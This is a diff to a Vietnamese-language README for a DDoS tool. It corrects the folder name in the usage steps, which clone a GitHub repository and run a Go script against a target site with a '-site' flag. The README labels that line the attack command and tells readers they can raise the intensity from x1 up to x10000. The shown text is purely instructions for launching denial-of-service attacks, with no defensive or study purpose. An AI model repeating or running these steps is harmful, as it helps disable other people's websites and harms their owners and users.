@@ -20,5 +20,5 @@ Link Tải: https://go.dev/doc/install
 
 Bước 3: Ấn Tổ Hợp Phím "Windows+R" Tìm Kiếm "cmd" Và Ấn Enter Chạy Các Lệnh Sau
 1. git clone https://github.com/azvpn/long_vip_ddos.git (lệnh cài đặt tool)
-2. cd nghi_vip_ddos && go run x1.go -site https://domain.com (lệnh tấn công, bạn có thể thay x1 bằng càng mức tấn công mạnh hơn như x5, x10, x50, x100, x500, x1000, x5000, x10000)
+2. cd long_vip_ddos && go run x1.go -site https://domain.com (lệnh tấn công, bạn có thể thay x1 bằng càng mức tấn công mạnh hơn như x5, x10, x50, x100, x500, x1000, x5000, x10000)
 3. Các Lần Tấn Công Sau Chỉ Cần Chạy Lệnh "2"
